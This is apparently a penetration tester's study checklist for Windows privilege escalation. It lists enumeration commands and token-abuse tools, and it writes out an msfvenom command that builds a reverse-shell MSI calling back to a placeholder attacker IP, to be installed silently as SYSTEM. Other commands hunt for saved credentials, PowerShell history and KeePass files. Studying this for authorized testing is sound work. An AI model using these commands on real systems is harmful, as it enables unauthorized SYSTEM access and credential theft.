# 03b. Windows Privilege Escalation
## Resources
- [[PE Enumeration]]
- [[PE Attacks]]
- [Abusing Tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
- [Hacktricks Checklist](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)

## Low Hanging Fruit
**Token Abuse**
- `whoami /priv` >> `SeImpersonatePrivilege`
- Use `PrintSpoofer` or `GodPotato`

**Check AlwaysInstallElevated Registry**
- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` if returns with `0x1` make an MSI, it'll run as SYSTEM
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_ip LPORT=LOCAL_PORT -f msi -o malicious.msi`
- `msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

**Cached Credentials**
- `cmdkey /list`

**Powershell History**
- `Get-History` 
* `(Get-PSReadlineOption).HistorySavePath`
-  `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`


## Checklist
- **Get context, users, groups**
	- `whoami` `net user` `net group` `whoami /groups`
- **Check for tokens/privileges**
	- `whoami /priv` >> `SeImpersonatePrivilege`
- **Check registry keys**
	- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` >> `0x1`
- **Check for cached creds**
	- `cmdkey /list`
- **Check PowerShell History**
	- `(Get-PSReadlineOption).HistorySavePath`
- **Check running services for Unquoted or Non-default locations**
	- `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
- **Check for non-default binaries looking for .dll files (like log files too)**
	- `C:\TEMP\???` `C:\Users\user\???` `C:\backup\???` etc
- **Check for useful files in User's directory**
	- `Get-ChildItem -Path C:\Users\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`
	- `*.log` `*.kdbx` `*.xml` literally any weird files in user's directory
- **Check for scheduled tasks run by higher level**
	- `Get-ScheduledTask` `schtasks /query` `schtasks /query /fo LIST /v`
- **Check for database files**
	- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
- **Check for config files**
	- `Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
- **Check installed packages**
	- `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
	- `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
